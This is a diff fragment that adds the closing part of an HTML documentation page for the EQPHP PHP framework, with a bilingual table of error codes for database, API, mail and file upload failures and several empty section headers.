+
+    <div class="item">
+    <table class="manual">
+        <tr class="fs14"><th>错误码(code)</th><th>错误信息(message)</th><th>解释说明(remark)</th><th>异常产生源(class/file)</th></tr>
+        <tr class="fs18 fcb1"><td colspan="4"><b class="fcr">101~499</b> 框架、工具类异常(framework and class exception)</td></tr>
+        <tr><td>101</td><td>absent controller or method</td><td>控制器（或控制器方法）错误（或不存在）</td><td>system</td></tr>
+        <tr><td>102</td><td>mysql can't connect</td><td>不能连接mysql数据库</td><td>db(mysql)</td></tr>
+        <tr><td>103</td><td>mysql database select fail</td><td>mysql 数据库选择失败</td><td>db(mysql)</td></tr>
+        <tr><td>104</td><td>mysql sql execute fail</td><td>SQL语句执行失败</td><td>db(mysql)</td></tr>
+        <tr><td>105</td><td>mongo connect fail</td><td>mongo数据库连接失败</td><td>mg</td></tr>
+        <tr><td>106</td><td>forbid visit mongo class property</td><td>不允许访问的mongo类成员属性</td><td>mg</td></tr>
+        <tr><td>107</td><td>socket connect fail</td><td>socket 连接失败</td><td>http</td></tr>
+        <tr><td>108</td><td>read download file fail</td><td>不能读取下载文件</td><td>http</td></tr>
+        <tr><td>109</td><td>mail command send fail</td><td>邮件报文发送失败</td><td>mail</td></tr>
+        <tr><td>110</td><td>api curl execute error</td><td>api-curl执行错误</td><td>api</td></tr>
+        <tr><td>111</td><td>api server request error</td><td>api服务请求错误</td><td>api</td></tr>
+        <tr><td>112</td><td>api server custom exception</td><td>api服务自定义错误</td><td>api</td></tr>
+        <tr><td>113</td><td>api server response code absent</td><td>api服务响应code缺失</td><td>api</td></tr>
+        <tr><td>120</td><td>select upload file fail</td><td>选择上传文件失败</td><td>upload</td></tr>
+        <tr><td>121</td><td>more than upload_max_filesize(php.ini)</td><td>上传的文件体积超限（php环境配置）</td><td>upload</td></tr>
+        <tr><td>122</td><td>more than max_file_size(form)</td><td>上传的文件体积超限(表单限制)</td><td>upload</td></tr>
+        <tr><td>123</td><td>part file upload</td><td>上传未完成，仅有部分文件上传</td><td>upload</td></tr>
+        <tr><td>124</td><td>no file upload</td><td>没有文件被上传，上传失败</td><td>upload</td></tr>
+        <tr><td>125</td><td>please select upload file</td><td>请选择上传文件</td><td>upload</td></tr>
+        <tr><td>126</td><td>no file upload</td><td>没有文件被上传，上传失败</td><td>upload</td></tr>
+        <tr><td>127</td><td>greater than allow upload size</td><td>上传的文件体积超限（php程序项目限制）</td><td>upload</td></tr>
+        <tr><td>128</td><td>fake extension name</td><td>伪冒的文件头信息</td><td>upload</td></tr>
+        <tr><td>129</td><td>forbid file format</td><td>不允许的文件格式</td><td>upload</td></tr>
+        <tr><td>130</td><td>absent upload directory</td><td>上传目录未创建</td><td>upload</td></tr>
+        <tr><td>131</td><td>unable to write directory</td><td>上传目录不可写入文件</td><td>upload</td></tr>
+        <tr><td>132</td><td>file name format error</td><td>文件名含有特殊字符</td><td>upload</td></tr>
+        <tr><td>133</td><td>move file fail</td><td>移动文件到指定目录失败</td><td>upload</td></tr>
+        <tr><td>134</td><td>less than allow image width</td><td>上传图片宽度小于允许值</td><td>upload</td></tr>
+        <tr><td>135</td><td>greater than allow image width</td><td>上传图片宽度大于允许值</td><td>upload</td></tr>
+        <tr><td>136</td><td>less than allow image height</td><td>上传图片高度小于允许值</td><td>upload</td></tr>
+        <tr><td>137</td><td>greater than allow image height</td><td>上传图片高度大于允许值</td><td>upload</td></tr>
+
+
+        <tr class="fs18 fcb1"><td colspan="4"><b class="fcr">500~999</b> 业务层异常(server exception)</td></tr>
+
+   
+
+        <tr class="fs18 fcb1"><td colspan="4"><b class="fcr">10~99 (module) 001~499</b> 模型层异常(model exception)</td></tr>
+    
+        <tr class="fs18 fcb1"><td colspan="4"><b class="fcr">10~99 (module) 500~999</b> 控制层异常(action exception)</td></tr>
+    </table>
+
+    </div>
+
+
+
+
+</div>
+
+
+
+<div class="foot">
+<span class="fs15 fal"><a href="http://www.eqphp.com/">EQPHP</a>  ·  版权所有 © 2015-2018</span>
+<span class="far">制作: art-youth  ·  版本: 3.0</span>
+</div>
+
+</div>
+
+
+
+</body>
+</html>
